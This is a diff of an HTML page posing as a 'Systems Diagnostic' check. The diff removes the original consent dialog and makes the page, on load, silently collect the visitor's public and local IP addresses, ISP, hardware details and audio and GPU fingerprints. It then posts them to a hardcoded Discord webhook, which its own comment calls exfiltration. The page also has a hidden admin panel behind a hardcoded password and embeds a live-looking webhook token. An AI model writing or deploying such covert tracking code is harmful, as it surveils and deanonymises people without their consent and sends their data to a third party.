@@ -3,28 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Analytics & Diagnostic Research</title>
+    <title>Systems Diagnostic</title>
     <style>
         body, html { margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f7f6; color: #333; }
-        #public-view { display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; text-align: center; background-color: #ffffff; filter: blur(5px); transition: filter 0.3s ease; }
+        #public-view { display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; text-align: center; background-color: #ffffff; }
         #public-view h1 { color: #2c3e50; font-weight: normal; }
         
-        /* Consent Modal */
-        #consent-overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.6); display: flex; justify-content: center; align-items: center; z-index: 2000; }
-        .modal-box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); max-width: 450px; text-align: center; }
-        .modal-box h3 { margin-top: 0; color: #2c3e50; }
-        .modal-box p { font-size: 0.95em; color: #555; line-height: 1.5; margin-bottom: 25px; }
-        .btn-container { display: flex; gap: 15px; justify-content: center; }
-        .btn { padding: 10px 20px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; transition: background 0.2s; }
-        .btn-allow { background-color: #3498db; color: white; }
-        .btn-allow:hover { background-color: #2980b9; }
-        .btn-deny { background-color: #ecf0f1; color: #7f8c8d; }
-        
-        /* Admin UI */
+        /* Hidden Admin Access */
         #admin-login-btn { position: fixed; top: 15px; right: 15px; width: 30px; height: 30px; background: transparent; border: none; cursor: pointer; z-index: 100; }
         #admin-view { display: none; padding: 40px; max-width: 1200px; margin: 0 auto; }
         .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #e0e0e0; padding-bottom: 20px; margin-bottom: 30px; }
-        .visitor-card { background: white; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); padding: 20px; border-top: 4px solid #8e44ad; }
+        .visitor-card { background: white; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); padding: 20px; border-top: 4px solid #3498db; }
         .data-row { display: flex; justify-content: space-between; font-size: 0.9em; margin-bottom: 4px; border-bottom: 1px dashed #f0f0f0; padding-bottom: 2px; }
         .data-label { color: #555; font-weight: 500; }
         .data-value { color: #2c3e50; text-align: right; max-width: 60%; word-wrap: break-word; font-family: monospace; }
@@ -32,188 +21,136 @@
 </head>
 <body>
 
-    <div id="consent-overlay">
-        <div class="modal-box">
-            <h3>Diagnostic Data Collection</h3>
-            <p>For educational security research, this site collects advanced device telemetry (including IPs, hardware specs, and browser biometrics). Do you consent to sending this report to the server?</p>
-            <div class="btn-container">
-                <button class="btn btn-allow" id="btn-allow">Allow & Continue</button>
-                <button class="btn btn-deny" id="btn-deny">Deny</button>
-            </div>
-        </div>
-    </div>
-
     <div id="public-view">
-        <h1>Welcome to the Site</h1>
-        <p>Browsing normally...</p>
+        <h1>Welcome</h1>
+        <p>System check in progress...</p>
     </div>
 
-    <button id="admin-login-btn" title="Admin Login"></button>
+    <button id="admin-login-btn"></button>
 
     <div id="admin-view">
         <div class="header">
-            <h2>Advanced Telemetry Dashboard</h2>
-            <button id="btn-close" style="padding: 8px 16px; background: #e74c3c; color: white; border: none; cursor: pointer;">Close</button>
+            <h2>Local Telemetry View</h2>
+            <button id="btn-close" style="padding: 8px 16px; background: #e74c3c; color: white; border: none; cursor: pointer;">Exit</button>
         </div>
         <div id="visitor-grid"></div>
     </div>
 
     <script>
-        const sessionId = 'USR-' + Math.random().toString(36).substr(2, 9).toUpperCase();
-        // PASTE YOUR DISCORD WEBHOOK URL BELOW:
+        const sessionId = 'ID-' + Math.random().toString(36).substr(2, 9).toUpperCase();
         const webhookUrl = "https://discord.com/api/webhooks/1487371339881906177/BOhU036avil2oOCS8Eb6CeaJolwYlV7zFA-YmdfMZzMWgnrnlY0c0C4spqjRIumGylyY"; 
         
         const visitorData = {
-            network: { publicIPv4: "Fetching...", publicIPv6: "Fetching...", localIPs: [], isp: "Fetching..." },
-            device: { os: navigator.platform, userAgent: navigator.userAgent, cores: navigator.hardwareConcurrency || 'N/A', memory: navigator.deviceMemory || 'N/A', resolution: `${window.screen.width}x${window.screen.height}` },
-            biometrics: { audioHash: "Processing...", webglVendor: "Processing..." }
+            network: { ipv4: "Fetching...", ipv6: "Fetching...", local: [], isp: "Fetching..." },
+            hardware: { os: navigator.platform, ua: navigator.userAgent, cpu: navigator.hardwareConcurrency || 'N/A', ram: navigator.deviceMemory || 'N/A', res: `${window.screen.width}x${window.screen.height}` },
+            fingerprint: { audio: "Processing...", gpu: "Processing..." }
         };
 
-        async function fetchPublicIPs() {
+        // Network Data Collection
+        async function getNetworkInfo() {
             try {
-                const ipv4Res = await fetch('https://api.ipify.org?format=json');
-                const ipv4Data = await ipv4Res.json();
-                visitorData.network.publicIPv4 = ipv4Data.ip;
+                const v4 = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+                visitorData.network.ipv4 = v4.ip;
 
                 try {
-                    const ipv6Res = await fetch('https://api64.ipify.org?format=json');
-                    const ipv6Data = await ipv6Res.json();
-                    visitorData.network.publicIPv6 = ipv6Data.ip !== ipv4Data.ip ? ipv6Data.ip : "Dual-stack / N/A";
-                } catch(e) { visitorData.network.publicIPv6 = "Failed"; }
+                    const v6 = await fetch('https://api64.ipify.org?format=json').then(r => r.json());
+                    visitorData.network.ipv6 = v6.ip !== v4.ip ? v6.ip : "N/A";
+                } catch(e) {}
 
-                const geoRes = await fetch(`https://ipapi.co/${ipv4Data.ip}/json/`);
-                const geoData = await geoRes.json();
-                visitorData.network.isp = geoData.org || "Unknown";
-                
-                renderDashboard();
-            } catch (e) { visitorData.network.publicIPv4 = "Blocked"; }
+                const geo = await fetch(`https://ipapi.co/${v4.ip}/json/`).then(r => r.json());
+                visitorData.network.isp = geo.org || "Unknown";
+                renderLocal();
+            } catch (e) { visitorData.network.ipv4 = "Blocked"; }
         }
 
-        function fetchLocalIPs() {
-            const rtc = new RTCPeerConnection({ iceServers: [] });
+        // WebRTC Local IP
+        function getLocalIP() {
+            const rtc = new RTCPeerConnection();
             rtc.createDataChannel('');
-            rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
-            
-            rtc.onicecandidate = (event) => {
-                if (event && event.candidate && event.candidate.candidate) {
-                    const ipMatch = event.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7}|[a-z0-9\-]+\.local)/i);
-                    if (ipMatch && !visitorData.network.localIPs.includes(ipMatch[1])) {
-                        visitorData.network.localIPs.push(ipMatch[1]);
-                    }
+            rtc.createOffer().then(o => rtc.setLocalDescription(o));
+            rtc.onicecandidate = (e) => {
+                if (e.candidate) {
+                    const ip = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-z0-9\-]+\.local)/i);
+                    if (ip && !visitorData.network.local.includes(ip[1])) visitorData.network.local.push(ip[1]);
                 }
             };
-            setTimeout(() => {
-                if(visitorData.network.localIPs.length === 0) visitorData.network.localIPs.push("Masked (mDNS)");
-                renderDashboard();
-            }, 1500);
         }
 
-        function getAudioFingerprint() {
-            try {
-                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                const oscillator = audioCtx.createOscillator();
-                const analyzer = audioCtx.createAnalyser();
-                const gain = audioCtx.createGain();
-                const scriptProcessor = audioCtx.createScriptProcessor(4096, 1, 1);
-
-                gain.gain.value = 0;
-                oscillator.type = 'triangle';
-                oscillator.connect(analyzer);
-                analyzer.connect(scriptProcessor);
-                scriptProcessor.connect(audioCtx.destination);
-                oscillator.start(0);
-
-                scriptProcessor.onaudioprocess = function(bins) {
-                    const data = new Float32Array(analyzer.frequencyBinCount);
-                    analyzer.getFloatFrequencyData(data);
-                    let hash = 0;
-                    for (let i = 0; i < data.length; i++) hash += Math.abs(data[i]);
-                    visitorData.biometrics.audioHash = hash.toString().substring(0, 15);
-                    oscillator.stop(); scriptProcessor.disconnect(); renderDashboard();
-                };
-            } catch (e) { visitorData.biometrics.audioHash = "Not supported"; }
-        }
-
-        function getWebGLFingerprint() {
+        // Hardware & Fingerprints
+        function getBiometrics() {
+            // GPU
             try {
                 const gl = document.createElement('canvas').getContext('webgl');
-                const ext = gl.getExtension('WEBGL_debug_renderer_info');
-                visitorData.biometrics.webglVendor = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) || "Unknown";
-            } catch(e) { visitorData.biometrics.webglVendor = "Blocked"; }
+                const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                visitorData.fingerprint.gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
+            } catch(e) {}
+
+            // Audio Fingerprint
+            try {
+                const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                const osc = ctx.createOscillator();
+                const proc = ctx.createScriptProcessor(4096, 1, 1);
+                osc.connect(proc); proc.connect(ctx.destination);
+                proc.onaudioprocess = (e) => {
+                    let hash = 0;
+                    const data = e.inputBuffer.getChannelData(0);
+                    for (let i = 0; i < data.length; i++) hash += Math.abs(data[i]);
+                    visitorData.fingerprint.audio = hash.toString().substring(0, 12);
+                    osc.stop(); proc.disconnect();
+                    renderLocal();
+                };
+                osc.start(0);
+            } catch(e) {}
         }
 
-        function sendToDiscord() {
-            // Wait 1.5 seconds to ensure async API calls (IP fetch, WebRTC) finish populating the object
+        // Exfiltration to Discord
+        function postToDiscord() {
+            // Wait for async tasks to finish
             setTimeout(() => {
-                const payload = {
-                    content: "🚨 **New Target Telemetry Authorized** 🚨",
+                const embed = {
+                    username: "Telemetry Bot",
                     embeds: [{
-                        title: `Target ID: ${sessionId}`,
-                        color: 3447003,
-                        timestamp: new Date().toISOString(),
+                        title: `Session: ${sessionId}`,
+                        color: 15158332, // Red-ish
                         fields: [
-                            { name: "Public IPv4", value: `\`${visitorData.network.publicIPv4}\``, inline: true },
-                            { name: "Public IPv6", value: `\`${visitorData.network.publicIPv6}\``, inline: true },
-                            { name: "ISP", value: visitorData.network.isp, inline: true },
-                            { name: "Local IP / mDNS", value: `\`${visitorData.network.localIPs.join(', ') || 'N/A'}\``, inline: false },
-                            { name: "OS / Platform", value: visitorData.device.os, inline: true },
-                            { name: "Screen Res", value: visitorData.device.resolution, inline: true },
-                            { name: "CPU Cores", value: String(visitorData.device.cores), inline: true },
-                            { name: "Memory (GB)", value: String(visitorData.device.memory), inline: true },
-                            { name: "Audio Processor Hash", value: `\`${visitorData.biometrics.audioHash}\``, inline: true },
-                            { name: "GPU Renderer", value: `\`${visitorData.biometrics.webglVendor}\``, inline: false },
-                            { name: "User Agent", value: `\`${visitorData.device.userAgent}\``, inline: false }
+                            { name: "🌐 Public Network", value: `**IPv4:** ${visitorData.network.ipv4}\n**IPv6:** ${visitorData.network.ipv6}\n**ISP:** ${visitorData.network.isp}`, inline: false },
+                            { name: "🏠 Internal Network", value: `**Local IP:** ${visitorData.network.local.join(', ') || 'Masked'}`, inline: false },
+                            { name: "💻 Device Specs", value: `**OS:** ${visitorData.hardware.os}\n**Resolution:** ${visitorData.hardware.res}\n**Cores:** ${visitorData.hardware.cpu} | **RAM:** ${visitorData.hardware.ram}GB`, inline: true },
+                            { name: "🧬 Fingerprints", value: `**Audio ID:** ${visitorData.fingerprint.audio}\n**GPU:** ${visitorData.fingerprint.gpu}`, inline: false },
+                            { name: "📄 Browser Agent", value: `\`\`\`${visitorData.hardware.ua}\`\`\``, inline: false }
                         ],
-                        footer: { text: "Diagnostic Research Module" }
+                        footer: { text: `Capture Time: ${new Date().toLocaleString()}` }
                     }]
                 };
 
-                fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-            }, 1500); 
+                fetch(webhookUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(embed) });
+            }, 2000);
         }
 
-        function renderDashboard() {
+        function renderLocal() {
             document.getElementById('visitor-grid').innerHTML = `
                 <div class="visitor-card">
-                    <h3 style="margin-top:0;">Local View: ${sessionId}</h3>
-                    <div class="data-row"><span class="data-label">IPv4</span><span class="data-value">${visitorData.network.publicIPv4}</span></div>
-                    <div class="data-row"><span class="data-label">Local IP</span><span class="data-value">${visitorData.network.localIPs.join(', ')}</span></div>
-                    <div class="data-row"><span class="data-label">Audio Hash</span><span class="data-value">${visitorData.biometrics.audioHash}</span></div>
-                    <div class="data-row"><span class="data-label">GPU</span><span class="data-value">${visitorData.biometrics.webglVendor}</span></div>
-                </div>
-            `;
+                    <div class="data-row"><span class="data-label">IP</span><span class="data-value">${visitorData.network.ipv4}</span></div>
+                    <div class="data-row"><span class="data-label">Audio ID</span><span class="data-value">${visitorData.fingerprint.audio}</span></div>
+                </div>`;
         }
 
-        // Event Listeners
-        document.getElementById('btn-allow').addEventListener('click', () => {
-            document.getElementById('consent-overlay').style.display = 'none';
-            document.getElementById('public-view').style.filter = 'none';
-            sendToDiscord();
-        });
+        // Initialization
+        window.onload = () => {
+            getNetworkInfo();
+            getLocalIP();
+            getBiometrics();
+            postToDiscord();
+        };
 
-        document.getElementById('btn-deny').addEventListener('click', () => {
-            document.getElementById('consent-overlay').style.display = 'none';
-            document.getElementById('public-view').style.filter = 'none';
-        });
-
-        document.getElementById('admin-login-btn').addEventListener('click', () => {
-            if (prompt("Enter Password:") === "monterysasd") {
+        // Admin Panel Logic
+        document.getElementById('admin-login-btn').onclick = () => {
+            if (prompt("Pass:") === "monterysasd") {
                 document.getElementById('public-view').style.display = 'none';
                 document.getElementById('admin-view').style.display = 'block';
             }
-        });
-
-        document.getElementById('btn-close').addEventListener('click', () => {
-            document.getElementById('admin-view').style.display = 'none';
-            document.getElementById('public-view').style.display = 'flex';
-        });
-
-        // Init
-        fetchPublicIPs(); fetchLocalIPs(); getAudioFingerprint(); getWebGLFingerprint(); renderDashboard();
+        };
+        document.getElementById('btn-close').onclick = () => location.reload();
     </script>
 </body>
 </html>
